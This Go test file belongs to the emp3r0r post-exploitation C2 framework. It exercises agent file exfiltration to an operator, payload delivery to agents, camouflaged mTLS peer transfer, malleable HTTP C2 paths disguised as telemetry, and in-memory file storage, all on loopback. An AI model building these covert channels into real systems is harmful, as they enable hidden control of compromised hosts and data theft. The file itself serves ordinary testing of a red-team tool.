package c2transport

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// startTestFileServer starts a minimal P2P file server that speaks the mesh bridge
// protocol (OpcodeFileRequest = 0x03) over mTLS. Returns the listening port string.
func startTestFileServer(t *testing.T, ctx context.Context) string {
	t.Helper()

	tr, err := transport.GetTransportImplementationStrict("mtls")
	if err != nil {
		t.Fatalf("resolve mtls transport: %v", err)
	}
	if camo, ok := tr.(*transport.CamouflageMTLS); ok {
		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
	}

	// Pick a random free port
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("find free port: %v", err)
	}
	port := fmt.Sprintf("%d", l.Addr().(*net.TCPAddr).Port)
	l.Close()

	listener, err := tr.Listen(port, common.RuntimeConfig.Password, def.MagicString)
	if err != nil {
		t.Fatalf("startTestFileServer listen on %s: %v", port, err)
	}

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	go func() {
		for ctx.Err() == nil {
			conn, err := tr.Accept(ctx, listener)
			if err != nil {
				return
			}
			go serveTestFileConn(conn)
		}
	}()

	// Wait for listener to be ready
	for range 50 {
		c, err := net.DialTimeout("tcp", "127.0.0.1:"+port, 200*time.Millisecond)
		if err == nil {
			c.Close()
			break
		}
		time.Sleep(100 * time.Millisecond)
	}

	return port
}

// serveTestFileConn handles one incoming connection using the bridge protocol.
func serveTestFileConn(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	op := make([]byte, 1)
	if _, err := conn.Read(op); err != nil {
		return
	}

	switch op[0] {
	case 0x02: // ping
		conn.Write([]byte{0x00})
	case 0x03: // file request
		// Read 4-byte LE filename length
		lenBuf := make([]byte, 4)
		if _, err := readFull(conn, lenBuf); err != nil {
			return
		}
		nameLen := binary.LittleEndian.Uint32(lenBuf)
		nameBuf := make([]byte, nameLen)
		if _, err := readFull(conn, nameBuf); err != nil {
			return
		}
		filename := string(nameBuf)

		conn.SetDeadline(time.Time{})
		data, err := util.ReadFileAgent(filename)
		if err != nil {
			// OpcodeErr
			msg := []byte(err.Error())
			lenBuf2 := make([]byte, 2)
			binary.LittleEndian.PutUint16(lenBuf2, uint16(len(msg)))
			conn.Write([]byte{0xFF})
			conn.Write(lenBuf2)
			conn.Write(msg)
			return
		}
		// OpcodeOK + 4-byte LE data len + data
		dataLenBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(dataLenBuf, uint32(len(data)))
		conn.Write([]byte{0x00})
		conn.Write(dataLenBuf)
		conn.Write(data)
	}
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

func TestFileTransfer_EndToEnd(t *testing.T) {
	common.RuntimeConfig = &def.Config{
		Password:          "e2e_test_password_123",
		P2PTransport:      "mtls",
		CamouflageCertOrg: "emp3r0r test org",
		CamouflageCertCN:  "emp3r0r test cn",
		P2PRelayPort:      "", // will be set per sub-test
	}

	testKey := []byte("12345678901234567890123456789012")
	util.SetFileCryptoKey(testKey)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start the test server
	serverPort := startTestFileServer(t, ctx)
	common.RuntimeConfig.P2PRelayPort = serverPort

	// Create a test file on disk
	fileName := fmt.Sprintf("e2e_transfer_%d.txt", time.Now().UnixNano())
	safeFilePath := filepath.Join(os.TempDir(), fileName)
	testContent := []byte("Real end-to-end P2P file transfer test content! 123456789")
	if err := util.WriteFileAgent(safeFilePath, testContent, 0o600); err != nil {
		t.Fatalf("write test source file: %v", err)
	}
	defer os.Remove(safeFilePath)
	checksum := crypto.SHA256SumRaw(testContent)

	t.Run("Disk Transfer End-to-End", func(t *testing.T) {
		destDir, err := os.MkdirTemp("", "dl_disk_test")
		if err != nil {
			t.Fatalf("create temp dest dir: %v", err)
		}
		defer os.RemoveAll(destDir)
		destPath := filepath.Join(destDir, "downloaded.txt")

		_, err = FetchFilePeer("127.0.0.1", safeFilePath, destPath, checksum)
		if err != nil {
			t.Fatalf("FetchFilePeer disk: %v", err)
		}

		got, err := util.ReadFileAgent(destPath)
		if err != nil {
			t.Fatalf("read downloaded disk file: %v", err)
		}
		if string(got) != string(testContent) {
			t.Fatalf("disk content mismatch: got %q want %q", got, testContent)
		}
		t.Logf("FetchFilePeer: saved %s to %s (%d bytes)", safeFilePath, destPath, len(got))
	})

	t.Run("MemFS Virtual Memory Transfer End-to-End", func(t *testing.T) {
		destMemPath := fmt.Sprintf("memfs:///downloaded_%d.txt", time.Now().UnixNano())

		_, err := FetchFilePeer("127.0.0.1", safeFilePath, destMemPath, checksum)
		if err != nil {
			t.Fatalf("FetchFilePeer mem: %v", err)
		}

		got, err := util.ReadFileAgent(destMemPath)
		if err != nil {
			t.Fatalf("read downloaded memfs:/// file: %v", err)
		}
		if string(got) != string(testContent) {
			t.Fatalf("mem content mismatch: got %q want %q", got, testContent)
		}
		t.Logf("FetchFilePeer: saved %s to %s (%d bytes)", safeFilePath, destMemPath, len(got))
	})

	t.Run("Serving From MemFS End-to-End", func(t *testing.T) {
		memFileName := fmt.Sprintf("memfs:///hosted_%d.txt", time.Now().UnixNano())
		memContent := []byte("Content stored inside host agent memfs virtual filesystem!")
		if err := util.WriteFileAgent(memFileName, memContent, 0o600); err != nil {
			t.Fatalf("write to memfs: %v", err)
		}

		memChecksum := crypto.SHA256SumRaw(memContent)
		destMemPath := fmt.Sprintf("memfs:///received_from_memfs_%d.txt", time.Now().UnixNano())

		_, err := FetchFilePeer("127.0.0.1", memFileName, destMemPath, memChecksum)
		if err != nil {
			t.Fatalf("FetchFilePeer memfs source: %v", err)
		}

		got, err := util.ReadFileAgent(destMemPath)
		if err != nil {
			t.Fatalf("read received memfs file: %v", err)
		}
		if string(got) != string(memContent) {
			t.Fatalf("memfs transfer mismatch: got %q want %q", got, memContent)
		}
		t.Logf("FetchFilePeer: saved %s to %s (%d bytes)", memFileName, destMemPath, len(got))
	})
}

func TestFetchFile_MemFSCaching(t *testing.T) {
	// Setup test data
	moduleName := fmt.Sprintf("sa_whoami_%d", time.Now().UnixNano())
	content := []byte("#!/bin/bash\necho 'whoami module content'")
	checksum := crypto.SHA256SumRaw(content)

	// Pre-populate memfs with the canonical key (memfs:///sa_whoami_...)
	memKey := MemFSKey(moduleName)
	if err := util.WriteFileAgent(memKey, content, 0o600); err != nil {
		t.Fatalf("WriteFileAgent failed: %v", err)
	}

	// FetchFile should hit memfs cache without touching peer or C2
	data, err := FetchFile(common.RuntimeConfig, "", moduleName, "", checksum)
	if err != nil {
		t.Fatalf("FetchFile failed: %v", err)
	}

	if string(data) != string(content) {
		t.Fatalf("FetchFile memfs cache content mismatch: got %q, want %q", string(data), string(content))
	}
}

func TestFetchFile_GossipPeerDiscovery(t *testing.T) {
	common.RuntimeConfig = &def.Config{
		Password:          "gossip_e2e_password",
		P2PTransport:      "mtls",
		CamouflageCertOrg: "emp3r0r test org",
		CamouflageCertCN:  "emp3r0r test cn",
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start test file server on a dynamic port
	serverPortStr := startTestFileServer(t, ctx)
	var serverPort int
	fmt.Sscanf(serverPortStr, "%d", &serverPort)

	// Pre-populate memfs with a module
	moduleName := fmt.Sprintf("sa_whoami_peer_%d", time.Now().UnixNano())
	content := []byte("#!/bin/bash\necho 'hello from peer'")
	memKey := MemFSKey(moduleName)
	if err := util.WriteFileAgent(memKey, content, 0o600); err != nil {
		t.Fatalf("write memfs: %v", err)
	}
	checksum := crypto.SHA256SumRaw(content)

	// Mock PeerFileProvider to simulate gossip metadata indicating 127.0.0.1 has moduleName on serverPort
	PeerFileProvider = func(fileName string) map[string]transport.PeerEndpoint {
		if fileName == moduleName || fileName == memKey {
			return map[string]transport.PeerEndpoint{
				"127.0.0.1": {Addr: "127.0.0.1", Port: serverPort, Transport: "mtls"},
			}
		}
		return nil
	}
	defer func() { PeerFileProvider = nil }()

	// Clear local cache for moduleName (under a different key) so it has to fetch from peer
	destMemPath := fmt.Sprintf("memfs:///result_%d.txt", time.Now().UnixNano())

	// Call FetchFile with peer="" -> should use PeerFileProvider, discover 127.0.0.1:serverPort, and pull from it
	data, err := FetchFile(common.RuntimeConfig, "", moduleName, destMemPath, checksum)
	if err != nil {
		t.Fatalf("FetchFile via gossip peer discovery failed: %v", err)
	}

	readData, err := util.ReadFileAgent(destMemPath)
	if err != nil {
		t.Fatalf("read destination file: %v", err)
	}
	if string(readData) != string(content) {
		t.Fatalf("content mismatch: got %q, want %q", string(readData), string(content))
	}
	_ = data
}

// TestFetchFilePeerRejectsUnknownTransport asserts that a peer advertising a
// transport this build cannot resolve fails before any network I/O, so callers
// can cheaply skip it and fall back to C2.
func TestFetchFilePeerRejectsUnknownTransport(t *testing.T) {
	oldCfg := common.RuntimeConfig
	t.Cleanup(func() { common.RuntimeConfig = oldCfg })
	common.RuntimeConfig = &def.Config{
		Password:     "pw",
		P2PTransport: "mtls",
		P2PRelayPort: "1",
	}

	_, err := FetchFilePeerWithEndpoint(
		transport.PeerEndpoint{Addr: "127.0.0.1", Port: 1, Transport: "no-such-transport"},
		"whatever", "", "",
	)
	if err == nil {
		t.Fatal("expected error for unknown peer transport")
	}
	if !strings.Contains(err.Error(), "no-such-transport") {
		t.Fatalf("error should name the offending transport, got: %v", err)
	}
}

// -----------------------------------------------------------------------------
// Operator <-> agent file transfer over the real C2 stack.
//
// These tests stand up a real plain-HTTP C2 server, enroll an agent in the
// trust database, and drive the real agent-side transfer functions
// (SendFile2CC and DownloadViaC2) through the real CC dispatcher and relay
// handlers:
//
//	agent --SendFile2CC--> CC handleFileUploadStream --> operator (FTP relay)
//	agent <--DownloadViaC2-- CC handleWWWRelayStream <-- operator (WWW relay)
//
// The operator is represented by one end of a net.Pipe handed to
// server.RegisterOperatorConn, which runs the same read loop as the websocket
// operator tunnel. This exercises the whole data path including gzip, the
// padded SecureConn framing, the bulk padding bypass, and checksum validation.

type e2eFileTransferHarness struct {
	tmpDir string
}

// e2eFreePort returns a currently free loopback TCP port.
func e2eFreePort(t *testing.T) int {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("free port: %v", err)
	}
	defer ln.Close()
	return ln.Addr().(*net.TCPAddr).Port
}

// e2eWaitForPort waits until addr accepts connections or the deadline passes.
func e2eWaitForPort(t *testing.T, addr string, deadline time.Time) {
	t.Helper()
	for time.Now().Before(deadline) {
		c, err := net.DialTimeout("tcp", addr, 200*time.Millisecond)
		if err == nil {
			c.Close()
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("port %s did not become ready", addr)
}

// e2eChunkConn is a read-only io.ReadWriteCloser fed by Push, modelling the
// operator-side FTP relay connection that reassembles an upload. It decouples
// the CC's forwarding goroutine from the operator's decompression so a slow
// reader can never make fwdMsgToOperator hit its write deadline.
type e2eChunkConn struct {
	ch     chan []byte
	closed chan struct{}
	once   sync.Once
	buf    []byte
}

func newE2EChunkConn() *e2eChunkConn {
	return &e2eChunkConn{ch: make(chan []byte, 256), closed: make(chan struct{})}
}

func (c *e2eChunkConn) Read(p []byte) (int, error) {
	for len(c.buf) == 0 {
		chunk, ok := <-c.ch
		if !ok {
			return 0, io.EOF
		}
		c.buf = chunk
	}
	n := copy(p, c.buf)
	c.buf = c.buf[n:]
	return n, nil
}

func (c *e2eChunkConn) Write(_ []byte) (int, error) {
	return 0, fmt.Errorf("e2eChunkConn is read-only")
}

func (c *e2eChunkConn) Close() error {
	c.once.Do(func() {
		close(c.ch)
		close(c.closed)
	})
	return nil
}

func (c *e2eChunkConn) Push(data []byte) error {
	select {
	case <-c.closed:
		return io.EOF
	default:
	}
	chunk := make([]byte, len(data))
	copy(chunk, data)
	c.ch <- chunk
	return nil
}

// setupE2EFileTransfer builds the C2 server, trust DB, agent identity and the
// agent-side runtime config. The caller is responsible for registering the
// operator tunnel with server.RegisterOperatorConn.
func setupE2EFileTransfer(t *testing.T) *e2eFileTransferHarness {
	t.Helper()

	tmpDir := t.TempDir()

	// Snapshot and restore every global this harness mutates. Tests share
	// process state, so leaking any of these would corrupt later tests.
	origLiveRuntime := live.RuntimeConfig
	origEmpWorkSpace := live.EmpWorkSpace
	origFileGetDir := live.FileGetDir
	origWWWRoot := live.WWWRoot
	origCCAddr := def.CCAddress
	origHTTPClient := def.HTTPClient
	origCommonRuntime := common.RuntimeConfig
	origAgentKey := agentutils.AgentKey
	origCACrtPEM := transport.CACrtPEM
	origCaCrtFile := transport.CaCrtFile
	origCaKeyFile := transport.CaKeyFile
	origEmpWorkSpaceT := transport.EmpWorkSpace

	t.Cleanup(func() {
		network.StopEmpHTTPServer()
		network.FTPStreams.Clear()
		_ = agents.CloseAgentDB()
		live.RuntimeConfig = origLiveRuntime
		live.EmpWorkSpace = origEmpWorkSpace
		live.FileGetDir = origFileGetDir
		live.WWWRoot = origWWWRoot
		def.CCAddress = origCCAddr
		def.HTTPClient = origHTTPClient
		common.RuntimeConfig = origCommonRuntime
		agentutils.AgentKey = origAgentKey
		transport.CACrtPEM = origCACrtPEM
		transport.CaCrtFile = origCaCrtFile
		transport.CaKeyFile = origCaKeyFile
		transport.EmpWorkSpace = origEmpWorkSpaceT
		transport.SetC2Padding(0, 0)
	})

	// Exercise padded control frames and the unpadded bulk relay path, which
	// is what these transfers use in production.
	transport.SetC2Padding(64, 1024)

	// Workspace paths used by the operator-side file reconstruction and the
	// WWW relay.
	live.EmpWorkSpace = tmpDir
	live.FileGetDir = filepath.Join(tmpDir, "file-get") + string(os.PathSeparator)
	live.WWWRoot = filepath.Join(tmpDir, "www") + string(os.PathSeparator)
	if err := os.MkdirAll(live.FileGetDir, 0o700); err != nil {
		t.Fatalf("mkdir FileGetDir: %v", err)
	}
	if err := os.MkdirAll(live.WWWRoot, 0o700); err != nil {
		t.Fatalf("mkdir WWWRoot: %v", err)
	}

	// CA: the plain-HTTP client still needs a CA bundle, and MsgAuth tokens
	// are CA-signed.
	caCertFile := filepath.Join(tmpDir, "ca-cert.pem")
	caKeyFile := filepath.Join(tmpDir, "ca-key.pem")
	if _, err := transport.GenCerts(nil, caCertFile, caKeyFile, "", "", true); err != nil {
		t.Fatalf("GenCerts CA: %v", err)
	}
	caCertData, err := os.ReadFile(caCertFile)
	if err != nil {
		t.Fatalf("read CA cert: %v", err)
	}
	transport.CACrtPEM = caCertData
	transport.CaCrtFile = caCertFile
	transport.CaKeyFile = caKeyFile
	transport.EmpWorkSpace = tmpDir

	// Agent identity: its own key for MsgAuth proofs, and a CA-signed UUID.
	agentPriv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatalf("agent key: %v", err)
	}
	agentPubPEM, err := transport.PublicKeyToPEM(&agentPriv.PublicKey)
	if err != nil {
		t.Fatalf("agent public key: %v", err)
	}
	agentutils.AgentKey = agentPriv
	agentUUID := util.RandHexString()
	agentTag := "e2e-file-agent-" + util.RandHexString()[:8]
	agentSig, err := transport.SignWithCAKey([]byte(agentUUID))
	if err != nil {
		t.Fatalf("sign agent uuid: %v", err)
	}
	agentSigB64 := base64.URLEncoding.EncodeToString(agentSig)

	routes := def.C2Routing{
		Checkin: "c2-checkin",
		Msg:     "c2-msg",
		FTP:     "c2-ftp",
		WWW:     "c2-www",
		Proxy:   "c2-proxy",
	}
	malleable := def.MalleableHTTPConfig{
		C2Path:        "/api/v1/telemetry",
		SessionHeader: "Cookie",
		SessionValue:  "sessionID=%s",
		InitHeader:    "Cookie",
		InitValue:     "init=1",
		CloseHeader:   "Cookie",
		CloseValue:    "close=1",
	}

	httpPort := e2eFreePort(t)
	live.RuntimeConfig = &def.Config{
		CCHTTPPort:          fmt.Sprintf("%d", httpPort),
		CAPEM:               string(caCertData),
		C2ChannelMode:       def.C2ChannelModePlainHTTP,
		C2Routes:            routes,
		MalleableC2:         malleable,
		OperatorIdleTimeout: 0,
	}

	// Trust DB: pin the agent public key so the dispatcher admits the FTP/WWW
	// routes without a prior check-in round trip.
	if err := agents.InitAgentDB(filepath.Join(tmpDir, "agents.db")); err != nil {
		t.Fatalf("InitAgentDB: %v", err)
	}
	target := &def.Emp3r0rAgent{
		UUID:      agentUUID,
		Tag:       agentTag,
		UUIDSig:   agentSigB64,
		PublicKey: string(agentPubPEM),
		Hostname:  "e2e-host",
		OS:        "linux",
		Arch:      "amd64",
		User:      "tester",
	}
	if err := agents.RecordAgentCheckin(target); err != nil {
		t.Fatalf("RecordAgentCheckin: %v", err)
	}

	// Real C2 plain-HTTP server.
	go server.StartC2HTTPServer()
	e2eWaitForPort(t, fmt.Sprintf("127.0.0.1:%d", httpPort), time.Now().Add(10*time.Second))

	// Agent-side runtime config and HTTP client.
	ccBase := fmt.Sprintf("http://127.0.0.1:%d", httpPort)
	def.CCAddress = ccBase
	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
	if def.HTTPClient == nil {
		t.Fatalf("CreateEmp3r0rHTTPClient failed")
	}
	common.RuntimeConfig = &def.Config{
		CCAddress:     ccBase,
		CCHTTPPort:    fmt.Sprintf("%d", httpPort),
		C2ChannelMode: def.C2ChannelModePlainHTTP,
		C2Routes:      routes,
		MalleableC2:   malleable,
		AgentUUID:     agentUUID,
		AgentUUIDSig:  agentSigB64,
		AgentTag:      agentTag,
		CCTimeout:     10000,
	}

	return &e2eFileTransferHarness{tmpDir: tmpDir}
}

// TestFileTransfer_AgentUploadsToOperator verifies agent -> CC -> operator:
// SendFile2CC gzips the file over the real SecureConn, handleFileUploadStream
// relays it to the operator, and the operator-side ftp.HandleFTPStream
// decompresses, checksums and commits it.
func TestFileTransfer_AgentUploadsToOperator(t *testing.T) {
	h := setupE2EFileTransfer(t)

	content := bytes.Repeat([]byte("agent-upload-to-operator-e2e-"), 1024) // ~29KB
	checksum := crypto.SHA256SumRaw(content)
	srcPath := filepath.Join(h.tmpDir, "agent_upload_src.bin")
	if err := os.WriteFile(srcPath, content, 0o600); err != nil {
		t.Fatalf("write source: %v", err)
	}

	// Token format expected by ftp.HandleFTPStream: <opaque>-<checksum>.
	token := fmt.Sprintf("%s-%s", util.RandHexString(), checksum)
	_, targetFile, _, _ := ftp.GenerateGetFilePaths(srcPath)

	sh := &network.StreamHandler{
		Token:           token,
		OperatorSession: "test-operator",
		ExpectedSize:    int64(len(content)),
		Checksum:        checksum,
		Ctx:             context.Background(),
		Cancel:          func() {},
	}
	network.FTPStreams.Store(srcPath, sh)
	network.FTPStreams.Store("token:"+token, sh)

	// Operator-side receiver.
	relay := newE2EChunkConn()
	go ftp.HandleFTPStream(relay, token, "e2e-operator", func() {})

	opCC, opTest := net.Pipe()
	server.RegisterOperatorConn("test-operator", opCC)
	t.Cleanup(func() {
		_ = opCC.Close()
		_ = opTest.Close()
	})

	opErr := make(chan error, 1)
	go func() {
		dec := cbor.NewDecoder(opTest)
		for {
			var msg def.MsgTunData
			if err := dec.Decode(&msg); err != nil {
				return
			}
			switch {
			case strings.HasPrefix(msg.Tag, def.TagFTPRelayDataPrefix):
				if err := relay.Push(msg.Response); err != nil {
					opErr <- fmt.Errorf("push ftp chunk: %w", err)
					return
				}
			case strings.HasPrefix(msg.Tag, def.TagFTPRelayDonePrefix):
				_ = relay.Close()
			case strings.HasPrefix(msg.Tag, def.TagFTPRelayErrorPrefix):
				opErr <- fmt.Errorf("ftp relay error: %s", msg.Response)
				_ = relay.Close()
			}
		}
	}()

	if err := SendFile2CC(srcPath, 0, token); err != nil {
		t.Fatalf("SendFile2CC: %v", err)
	}

	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case err := <-opErr:
			t.Fatalf("operator: %v", err)
		default:
		}
		got, err := os.ReadFile(targetFile)
		if err == nil {
			if !bytes.Equal(got, content) {
				t.Fatalf("received file mismatch: got %d bytes want %d", len(got), len(content))
			}
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("file was not received at %s", targetFile)
}

// TestFileTransfer_OperatorSendsToAgent verifies operator -> CC -> agent: the
// operator answers a WWW relay request with the file, handleWWWRelayStream
// pushes it over the agent's SecureConn, and DownloadViaC2 returns it.
func TestFileTransfer_OperatorSendsToAgent(t *testing.T) {
	setupE2EFileTransfer(t)

	content := bytes.Repeat([]byte("operator-sends-to-agent-e2e-"), 2048) // ~53KB
	checksum := crypto.SHA256SumRaw(content)
	fileName := "operator_payload.bin"
	if err := os.WriteFile(filepath.Join(live.WWWRoot, fileName), content, 0o600); err != nil {
		t.Fatalf("write hosted file: %v", err)
	}

	opCC, opTest := net.Pipe()
	server.RegisterOperatorConn("test-operator", opCC)
	t.Cleanup(func() {
		_ = opCC.Close()
		_ = opTest.Close()
	})

	opErr := make(chan error, 1)
	go func() {
		dec := cbor.NewDecoder(opTest)
		enc := cbor.NewEncoder(opTest)
		for {
			var msg def.MsgTunData
			if err := dec.Decode(&msg); err != nil {
				return
			}
			if !strings.HasPrefix(msg.Tag, def.TagWWWRelayRequestPrefix) {
				continue
			}
			streamID := strings.TrimPrefix(msg.Tag, def.TagWWWRelayRequestPrefix)
			path := filepath.Join(live.WWWRoot, filepath.Base(streamID))
			data, err := os.ReadFile(path)
			if err != nil {
				opErr <- fmt.Errorf("read hosted file: %v", err)
				_ = enc.Encode(&def.MsgTunData{
					Tag:      def.TagWWWRelayErrorPrefix + streamID,
					Response: []byte(err.Error()),
				})
				return
			}
			const chunkSize = 16 * 1024
			for off := 0; off < len(data); off += chunkSize {
				end := min(off+chunkSize, len(data))
				if err := enc.Encode(&def.MsgTunData{
					Tag:      def.TagWWWRelayDataPrefix + streamID,
					Response: data[off:end],
				}); err != nil {
					opErr <- fmt.Errorf("send www chunk: %v", err)
					return
				}
			}
			if err := enc.Encode(&def.MsgTunData{Tag: def.TagWWWRelayDonePrefix + streamID}); err != nil {
				opErr <- fmt.Errorf("send www done: %v", err)
				return
			}
		}
	}()

	got, err := DownloadViaC2(common.RuntimeConfig, fileName, "", checksum)
	if err != nil {
		select {
		case opErr := <-opErr:
			t.Fatalf("DownloadViaC2: %v (operator: %v)", err, opErr)
		default:
		}
		t.Fatalf("DownloadViaC2: %v", err)
	}
	if !bytes.Equal(got, content) {
		t.Fatalf("downloaded content mismatch: got %d bytes want %d", len(got), len(content))
	}
}
